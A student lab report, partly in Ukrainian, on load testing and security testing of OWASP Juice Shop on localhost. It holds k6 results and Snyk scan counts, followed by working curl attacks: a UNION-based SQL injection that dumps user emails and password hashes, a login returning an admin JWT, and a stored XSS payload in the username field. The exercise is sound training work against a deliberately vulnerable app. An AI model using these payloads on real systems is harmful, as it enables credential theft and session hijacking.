# lab_qa4

## 1 part stress test

project: Juice Shop

k6 used

cdreated 2 scenarios: Кожен віртуальний користувач сам реєструється, логіниться і виконує дії. Це імітує реальний потік нових відвідувачів.

2 scenario: заздалегідь створені користувачі Тут VU беруть готові креденшили з файлу — це імітує тест, де нема саме реєстрації а тільки вже логін, і перевіряється саме "гаряча" робота залогінених користувачів

```bash
█ THRESHOLDS

    http_req_duration
    ✗ 'p(95)<2000' p(95)=13.83s

    http_req_failed
    ✓ 'rate<0.05' rate=0.00% <- тобто жодного разу не впав і не видав помилку на 300 користувачах які логінились


  █ TOTAL RESULTS

    checks_total.......: 9704    31.184295/s
    checks_succeeded...: 100.00% 9704 out of 9704
    checks_failed......: 0.00%   0 out of 9704

    ✓ реєстрація успішна
    ✓ логін успішний
    ✓ токен отримано
    ✓ пошук успішний

    CUSTOM
    login_duration.................: avg=2867.875322 min=5.9462  med=2499.0523  max=9487.4069 p(90)=5915.22785 p(95)=7778.911175
    search_duration................: avg=2807.531732 min=0.5175  med=2549.49265 max=9130.2198 p(90)=6067.01095 p(95)=7175.606275

    HTTP
    http_req_duration..............: avg=4.26s       min=517.5µs med=3.03s      max=24.9s     p(90)=10.19s     p(95)=13.83s
      { expected_response:true }...: avg=4.26s       min=517.5µs med=3.03s      max=24.9s     p(90)=10.19s     p(95)=13.83s
    http_req_failed................: 0.00%  0 out of 7278
    http_reqs......................: 7278   23.388221/s

    EXECUTION
    iteration_duration.............: avg=15.81s      min=3.03s   med=15.34s     max=39.65s    p(90)=32.23s     p(95)=36.04s
    iterations.....................: 2426   7.796074/s
    vus............................: 1      min=1         max=300
    vus_max........................: 300    min=300       max=300

    NETWORK
    data_received..................: 8.0 MB 26 kB/s
    data_sent......................: 1.3 MB 4.3 kB/s


running (5m11.2s), 000/300 VUs, 2426 complete and 0 interrupted iterations
```

але ці результати не дають відповіді на якій кількості юзерів проєкт починає повільно відповідати і втрачати потужність. тому буду переписувати щоб зменшити к-сть і додати плато в навантаженні

додано було плато, файл який в табличку сортує результати k6:

```
Завантажено 5853 записів http_req_duration, 5853 записів http_req_failed

Плато      N запитів    Медіана (мс)    StdDev (мс)     % помилок
-----------------------------------------------------------------
VU=10      244          17.7            8.6             0.00
VU=25      577          50.5            52.9            0.00
VU=50      663          656.3           574.1           0.00
VU=75      605          1611.4          1448.5          0.00
VU=100     498          3436.9          3371.8          0.00
VU=150     432          5873.5          3162.1          0.00
```

Гранична кількість користувачів: 25, деградація починається на 50

Медіанний час відповіді на межі стабільності (VU=25): 50.5 мс
Стандартне відхилення (VU=25): 52.9 мс

Причина деградації: однопотоковий bcrypt + SQLite → чергування запитів без помилок

тепер сценарій Б де ми маємо вже дані користувачів, і просто логінимо їх а не реєструємо. Навіть з тим шо зараз там 300 UV тест відпрацював швидше. Бо сама дія реєстрації затратна часом і ресурсами. Як мінімум захешувати пароль юзера.

```
█ THRESHOLDS

    http_req_duration
    ✗ 'p(95)<2000' p(95)=5.6s

    http_req_failed
    ✓ 'rate<0.05' rate=0.00%


  █ TOTAL RESULTS

    checks_total.......: 12606   41.664597/s
    checks_succeeded...: 100.00% 12606 out of 12606
    checks_failed......: 0.00%   0 out of 12606

    ✓ логін успішний
    ✓ товари отримано
    ✓ кошик отримано

    HTTP
    http_req_duration..............: avg=1.86s min=273.39µs med=1.25s max=7.08s  p(90)=4.89s  p(95)=5.6s
      { expected_response:true }...: avg=1.86s min=273.39µs med=1.25s max=7.08s  p(90)=4.89s  p(95)=5.6s
    http_req_failed................: 0.00%  0 out of 12606
    http_reqs......................: 12606  41.664597/s

    EXECUTION
    iteration_duration.............: avg=8.6s  min=3.03s    med=6.73s max=18.18s p(90)=15.22s p(95)=16.97s
    iterations.....................: 4202   13.888199/s
    vus............................: 3      min=1          max=300
    vus_max........................: 300    min=300        max=300

    NETWORK
    data_received..................: 81 MB  268 kB/s
    data_sent......................: 8.0 MB 26 kB/s




running (5m02.6s), 000/300 VUs, 4202 complete and 0 interrupted iterations
default ✓ [======================================] 000/300 VUs  5m0s
ERRO[0303] thresholds on metrics 'http_req_duration' have been crossed
```

тут теж будем робити плато тест для пошуку точних цифр.

```
Завантажено 10465 записів http_req_duration, 10465 записів http_req_failed

Плато      N запитів    Медіана (мс)    StdDev (мс)     % помилок
-----------------------------------------------------------------
VU=10      245          21.4            12.1            0.00
VU=25      582          50.6            43.2            0.00
VU=50      958          242.2           183.3           0.00
VU=75      987          830.0           354.2           0.00
VU=100     1470         648.4           336.6           0.00
VU=150     1434         1436.0          628.9           0.00
```

Гранична кількість користувачів: 25

Так само, як і в сценарії А, злам відбувається між 25 і 50 — медіана стрибає з 50.6 мс до 242.2 мс (в 4.8 разів).
межа стабільності визначається не типом дії (реєстрація чи логін), а самим фактом одночасного навантаження на однопотоковий бекенд + SQLite: вона однакова для обох сценаріїв.

Медіанний час відповіді на межі стабільності: 50.6 мс
Стандартне відхилення: 43.2 м

До межі стабільності (25) різниці між сценаріями практично немає, при низькому навантаженні вартість bcrypt-хешування при реєстрації непомітна на фоні загального часу відповіді.
Після проходження межі (50) різниця стає драматичною, сценарій А (з реєстрацією) деградує в 2.7–5.3 рази сильніше, ніж сценарій Б (тільки логін вже існуючих юзерів), на тих самих рівнях навантаження

## 2 part OWASP

tool: snyk

```
snyk test

Testing D:\GitHub\lab_qa4\juice-shop...

Tested 814 dependencies for known issues, found 85 issues, 128 vulnerable paths.
```

в файлах snyk-dependencies та snyk-code можна знайти виводи які були в консолі при запуску команд.

Загальна проблема вразливостей, знайшлися А06 та А03 в комплекті, де sanitize-html має запобігати XSS а сам в собі має xss.

Ну а етап ін'єкцій наразі це будуть curl-и які і раніше на апі дизайні розглядалися.

### SQL:

підтвердження ін'єкції оскільки в запиті іде лапка і сервер її схавав.

```bash
PS D:\GitHub\lab_qa4\juice-shop> curl "http://localhost:3000/rest/products/search?q=apple'"
curl : The remote server returned an error: (500) Internal Server Error.
At line:1 char:1
+ curl "http://localhost:3000/rest/products/search?q=apple'"
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (System.Net.HttpWebRequest:HttpWebRequest) [Invoke-WebRequest], WebException
    + FullyQualifiedErrorId : WebCmdletWebResponseException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
```

також "пошуковий запит" який в результаті дав зробити запит в базу даних і отримати дані користувачів.

```bash
curl "http://localhost:3000/rest/products/search?q=apple')) UNION SELECT id, email, password, '4','5','6','7','8','9' FROM Users--"


StatusCode        : 200
StatusDescription : OK
Content           : {"status":"success","data":[{"id":1,"name":"admin@juice-sh.op","description":"0192023a7bbd73250516f069df18b500","price":"4","deluxePrice":"5","image":"6","createdAt":"7","upd
                    atedAt":"8","deletedAt":"9...
RawContent        : HTTP/1.1 200 OK
                    Access-Control-Allow-Origin: *
                    X-Content-Type-Options: nosniff
                    X-Frame-Options: SAMEORIGIN
                    Feature-Policy: payment 'self'
                    X-Recruiting: /#/jobs
                    Vary: Accept-Encoding
                    Connection:...
Forms             : {}
Headers           : {[Access-Control-Allow-Origin, *], [X-Content-Type-Options, nosniff], [X-Frame-Options, SAMEORIGIN], [Feature-Policy, payment 'self']...}
Images            : {}
InputFields       : {}
Links             : {}
ParsedHtml        : mshtml.HTMLDocumentClass
RawContentLength  : 4088
```

### HTML

розбираємось з XSS в html

```bash
curl.exe -s -X POST http://localhost:3000/rest/user/login `
>>   -H "Content-Type: application/json" `
>>   -d '{\"email\":\"admin@juice-sh.op\",\"password\":\"admin123\"}'
{"authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjoxLCJ1c2VybmFtZSI6IiIsImVtYWlsIjoiYWRtaW5AanVpY2Utc2gub3AiLCJwYXNzd29yZCI6IjAxOTIwMjNhN2JiZDczMjUwNTE2ZjA2OWRmMThiNTAwIiwicm9sZSI6ImFkbWluIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IiIsInByb2ZpbGVJbWFnZSI6ImFzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdEFkbWluLnBuZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0wNy0xNyAyMDo0MjowNC43MzMgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0wNy0xNyAyMDo0MjowNC43MzMgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiYmlkIjoxLCJpYXQiOjE3ODQzMjM0ODN9.f-r6CaZpUemj0I3dQ7CbUvMln369pGBSCl2D0wd5arxQjDmDjLU5wSbWJ_lyFzPZQ4vczhgqvkhY782C3HPLb726mamujrL0ZI_HuFho1T2mbxVTyY83AEgwBWKjUgZYE0f3c3ANlgzEHLKYuwP-weQeRMtKxfAziyqSFVaypnE","bid":1,"umail":"admin@juice-sh.op"}}
```

тут вже в запит заклали токен і

```html
PS D:\GitHub\lab_qa4\juice-shop> curl.exe -X POST http://localhost:3000/profile
` >> -H "Content-Type: application/x-www-form-urlencoded" ` >> -H "Cookie:
token=eyJ0mamujrL0ZI_HuFho1T2mbxVTyY83AEgwBWKjUgZYE0f3c3ANlgzEHLKYuwP-weQeRMtKxfAziyqSFVaypnE"
` >> -d "username=
<script>
  alert("XSS");
</script>
" Found. Redirecting to /profile
```

в результаті маємо шо токен авторизації в доступі, і зміна інформації користувача легко може піддатись ін'єкції. Це не є вразливістю сервера, або бази. Це вразливість того, що при побудові html файлу відбувається вставка імені користувача і спец символи можуть сприйнятись як частина html.

Браузер отримавши таку сторінку, не може відрізнити "це текст імені користувача" від "це справжній HTML-тег <script> і просто виконує його як код.
Результат атаки: довільний JavaScript виконується в браузері юзера від його імені, з його сесією. Це відкриває крадіжку сесій, дії від імені жертви, фішинг і точні дані скільки яблучного соку юзер купив в juice-shope

```html
D:\GitHub\lab_qa4\juice-shop> curl.exe -s http://localhost:3000/profile `
>>   -H "Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkwIiwiZGVsZXRlZEF0IjpudWxsfSwiYmlkIjoxLCJpYXQiOjE3ODQzMjM0ODN9.f-r6CaZpUemj0I3dQ7CbUvMln369pGBSCl2D0wd5arxQjDmDjLU5wSbWJ_lyFzPZQ4vczhgqvkhY782C3HPLb726mamujrL0ZI_HuFho1T2mbxVTyY83AEgwBWKjUgZYE0f3c3ANlgzEHLKYuwP-weQeRMtKxfAziyqSFVaypnE"
<!DOCTYPE html><html lang="en"><head><title>OWASP Juice Shop</title><meta charset="utf-8"><meta name="description" content=""><meta name="keywords" content=""><meta name="viewport" content="width=device-width, initial-scale=1.0"><link rel="icon" type="image/x-icon" href="./assets/public/favicon_js.ico"><link rel="stylesheet" href="/vendor/beercss/beer.min.css"><link rel="stylesheet" href="/vendor/material-icons/material-icons.css"><link rel="stylesheet" href="./assets/public/css/roboto.css" type="text/css"><link rel="stylesheet" href="./assets/public/css/userProfile.css" type="text/css"><script type="module" src="/vendor/beercss/beer.min.js"></script><style>body { background: #303030 !important; color: #FFFFFF !important; }
article { background: #3e3e3e !important; }
button.fill { background-color: #4f6f7a !important; color: #FFFFFF !important; }
.profile-field label { color: #FFFFFF !important; font-size: 13px !important; display: block !important; margin-bottom: 4px; }
.profile-field input { border: 1px solid #FFFFFF !important; border-radius: 4px !important; padding: 12px !important; font-size: 14px !important; color: #FFFFFF !important; background: transparent !important; width: 100% !important; box-sizing: border-box !important; height: auto !important; min-height: 44px !important; }
.profile-field input::placeholder { color: rgba(255,255,255,0.5); font-size: 0.85em; }
.profile-field { margin-bottom: 12px; }
.brand { display: flex; align-items: center; gap: 8px; text-decoration: none; color: #FFFFFF; }
.brand img { max-height: 50px; width: auto; }
.brand span { font: 500 20px/32px Roboto,"Helvetica Neue",sans-serif; }</style></head><body><header style="background: #4f6f7a; padding: 8px 16px;"><nav><a href="./#/" style="color: #FFFFFF; text-decoration:none;"><i class="material-icons">arrow_back</i></a><a href="./#/" style="color: #FFFFFF; text-decoration:none;">Back</a><a class="brand" href="./#/"><img src="assets/public/images/JuiceShop_Logo.png" alt="OWASP Juice Shop Logo"><span class="app-title">OWASP Juice Shop</span></a><div class="max"></div></nav></header><main style="padding: 16px;"><article id="card" style="min-width: 300px; max-width: 900px; margin: 24px auto; padding: 24px; border-radius: 12px;"><h5 style="color: #FFFFFF; margin-bottom: 16px;">User Profile</h5><div class="grid"><div class="s12 m12 l6"><img class="img-rounded" src="assets/public/images/uploads/defaultAdmin.png" alt="profile picture" width="90%" height="236" style="margin-right: 5%; margin-left: 5%;"><p style="margin-top: 8px; color: #FFFFFF; text-align: center;">\lert('XSS')</script></p><form action="./profile/image/file" style="margin-top: 16px; width: 90%; margin-right: auto; margin-left: auto;" method="post" enctype="multipart/form-data"><div class="profile-field"><label for="picture">File Upload:</label><input id="picture" type="file" accept="image/*" name="file" size="150" aria-label="Input for selecting the profile picture"></div><button class="fill" type="submit" style="margin-top: 8px; text-transform: capitalize;" aria-label="Button to upload the profile picture">Upload Picture</button></form><div class="breakLine" style="margin-top: 12px; margin-bottom: 12px; width: 90%; margin-right: auto; margin-left: auto;"><div class="line"><div></div></div><div class="textOnLine" style="color: #FFFFFF;">or</div><div class="line"><div></div></div></div><form action="./profile/image/url" style="margin-top: 8px; width: 90%; margin-right: auto; margin-left: auto;" method="post"><div class="profile-field"><label for="url">Image URL:</label><input id="url" type="text" name="imageUrl" placeholder="e.g. https://www.gravatar.com/avatar/526703ac2bd7cd675e872393a0744bf5" aria-label="Text field for the image link"></div><button class="fill" id="submitUrl" type="submit" style="margin-top: 8px; text-transform: capitalize;" aria-label="Button to include image from link">Link Image</button></form></div><div class="s12 m12 l6"><form action="./profile" method="post" style="width: 90%; margin-right: auto; margin-left: auto;"><div class="profile-field"><label for="email">Email:</label><input id="email" type="email" name="email" value="admin@juice-sh.op" disabled style="opacity: 0.7;" aria-label="Disabled - Text field for the email"></div><div class="profile-field"><label for="username">Username:</label><input id="username" type="text" name="username" value="lert('XSS')&lt;/script&gt;" placeholder="e.g. SuperUser" aria-label="Text field for the username"></div><button class="fill" id="submit" type="submit" style="margin-top: 8px; text-transform: capitalize;" aria-label="Button to save/set the username">Set Username</button></form></div></div></article></main></body></html>
```
